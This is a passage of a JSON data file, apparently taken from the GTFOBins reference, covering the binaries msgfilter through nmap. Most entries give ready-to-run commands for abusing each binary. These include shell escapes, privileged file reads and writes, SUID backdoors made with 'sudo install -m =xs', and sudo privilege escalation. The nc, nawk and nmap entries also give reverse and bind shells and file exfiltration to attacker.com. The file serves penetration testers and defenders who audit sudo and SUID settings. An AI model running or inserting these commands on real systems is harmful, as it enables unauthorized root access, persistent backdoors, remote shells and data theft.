                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Any text file will do as the input (use -i). kill is needed to spawn the shell only once.",
                        "code": "sudo install -m =xs $(which msgfilter) .\n\necho x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Any text file will do as the input (use -i). kill is needed to spawn the shell only once.",
                        "code": "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"
                    }
                ]
            }
        ]
    },
    {
        "name": "msgmerge",
        "url": "https://gtfobins.github.io/gtfobins/msgmerge/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nmsgmerge -P $LFILE /dev/null"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which msgmerge) .\n\nLFILE=file_to_read\n./msgmerge -P $LFILE /dev/null"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null"
                    }
                ]
            }
        ]
    },
    {
        "name": "msguniq",
        "url": "https://gtfobins.github.io/gtfobins/msguniq/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nmsguniq -P $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which msguniq) .\n\nLFILE=file_to_read\n./msguniq -P $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo msguniq -P $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "mtr",
        "url": "https://gtfobins.github.io/gtfobins/mtr/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nmtr --raw -F \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "multitime",
        "url": "https://gtfobins.github.io/gtfobins/multitime/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "multitime /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which multitime) .\n\n./multitime /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo multitime /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "mysql",
        "url": "https://gtfobins.github.io/gtfobins/mysql/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "mysql -e '\\! /bin/sh'"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "A MySQL server must accept connections in order for this to work.\n\nThe following loads the /path/to/lib.so shared object.",
                        "code": "mysql --default-auth ../../../../../path/to/lib"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo mysql -e '\\! /bin/sh'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which mysql) .\n\n./mysql -e '\\! /bin/sh'"
                    }
                ]
            }
        ]
    },
    {
        "name": "nano",
        "url": "https://gtfobins.github.io/gtfobins/nano/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "nano\n^R^X\nreset; sh 1>&0 2>&0"
                    },
                    {
                        "description": "The SPELL environment variable can be used in place of the -s option if the command line cannot be changed.",
                        "code": "nano -s /bin/sh\n/bin/sh\n^T"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "nano file_to_write\nDATA\n^O"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "nano file_to_read"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "The SPELL environment variable can be used in place of the -s option if the command line cannot be changed.",
                        "code": "sudo install -m =xs $(which nano) .\n\n./nano -s /bin/sh\n/bin/sh\n^T"
                    }
                ]
            }
        ]
    },
    {
        "name": "mv",
        "url": "https://gtfobins.github.io/gtfobins/mv/",
        "functions": [
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which mv) .\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "nasm",
        "url": "https://gtfobins.github.io/gtfobins/nasm/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nnasm -@ $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which nasm) .\n\nLFILE=file_to_read\n./nasm -@ $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo nasm -@ $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "nawk",
        "url": "https://gtfobins.github.io/gtfobins/nawk/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "nawk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nnawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
                    }
                ]
            },
            {
                "function": "Non-interactive bind shell",
                "description": "It can bind a non-interactive shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell.",
                        "code": "LPORT=12345\nnawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nnawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nnawk '//' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which nawk) .\n\nLFILE=file_to_read\n./nawk '//' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which nawk) .\n\n./nawk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "ncdu",
        "url": "https://gtfobins.github.io/gtfobins/ncdu/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ncdu\nb"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ncdu\nb"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ncdu) .\n\n./ncdu\nb"
                    }
                ]
            }
        ]
    },
    {
        "name": "nc",
        "url": "https://gtfobins.github.io/gtfobins/nc/",
        "functions": [
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nnc -e /bin/sh $RHOST $RPORT"
                    }
                ]
            },
            {
                "function": "Bind shell",
                "description": "It can bind a shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell. This only works with netcat traditional.",
                        "code": "LPORT=12345\nnc -l -p $LPORT -e /bin/sh"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nnc $RHOST $RPORT < \"$LFILE\""
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file.",
                        "code": "LPORT=12345\nLFILE=file_to_save\nnc -l -p $LPORT > \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.",
                        "code": "sudo install -m =xs $(which nc) .\n\nRHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT"
                    }
                ]
            }
        ]
    },
    {
        "name": "ncftp",
        "url": "https://gtfobins.github.io/gtfobins/ncftp/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ncftp\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ncftp) .\n\n./ncftp\n!/bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ncftp\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "neofetch",
        "url": "https://gtfobins.github.io/gtfobins/neofetch/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nneofetch --config $TF"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.",
                        "code": "LFILE=file_to_read\nneofetch --ascii $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "nft",
        "url": "https://gtfobins.github.io/gtfobins/nft/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nnft -f \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which nft) .\n\nLFILE=file_to_read\n./nft -f \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo nft -f \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "nice",
        "url": "https://gtfobins.github.io/gtfobins/nice/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "nice /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which nice) .\n\n./nice /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo nice /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "nl",
        "url": "https://gtfobins.github.io/gtfobins/nl/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which nl) .\n\nLFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "nm",
        "url": "https://gtfobins.github.io/gtfobins/nm/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nnm @$LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which nm) .\n\nLFILE=file_to_read\n./nm @$LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo nm @$LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "nmap",
        "url": "https://gtfobins.github.io/gtfobins/nmap/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "Input echo is disabled.",
                        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF"
                    },
                    {
                        "description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
                        "code": "nmap --interactive\nnmap> !sh"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF"
                    }
                ]
            },
            {
                "function": "Non-interactive bind shell",
                "description": "It can bind a non-interactive shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell.",
                        "code": "export LPORT=12345\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();' > $TF\nnmap --script=$TF"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.",
                        "code": "RHOST=attacker.com\nRPORT=8080\nLFILE=file_to_send\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE"
                    },
                    {
                        "description": "Send a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nTF=$(mktemp)\necho 'local f=io.open(os.getenv(\"LFILE\"), 'rb')\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nt:send(d);\nt:close();' > $TF\nnmap --script=$TF"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., php -S 0.0.0.0:8080. Note that multiple connections are made to the server and the result is placed in $TF/IP/PORT/PATH. Also, it is important that the port is a commonly used HTTP like 80 or 8080.",
                        "code": "RHOST=attacker.com\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=file_to_save\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE"
                    },
                    {
                        "description": "Fetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file.",
                        "code": "export LPORT=12345\nexport LFILE=file_to_save\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(os.getenv(\"LFILE\"), \"wb\");\nf:write(d);\nio.close(f);' > $TF\nnmap --script=$TF"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF"
                    },
                    {
                        "description": "The payload appears inside the regular nmap output.",
                        "code": "LFILE=file_to_write\nnmap -oG=$LFILE DATA"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF"
                    },
                    {
                        "description": "The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.",
                        "code": "nmap -iL file_to_read"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "The payload appears inside the regular nmap output.",
                        "code": "sudo install -m =xs $(which nmap) .\n\nLFILE=file_to_write\n./nmap -oG=$LFILE DATA"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Input echo is disabled.",
                        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF"
                    },
                    {
                        "description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
                        "code": "sudo nmap --interactive\nnmap> !sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
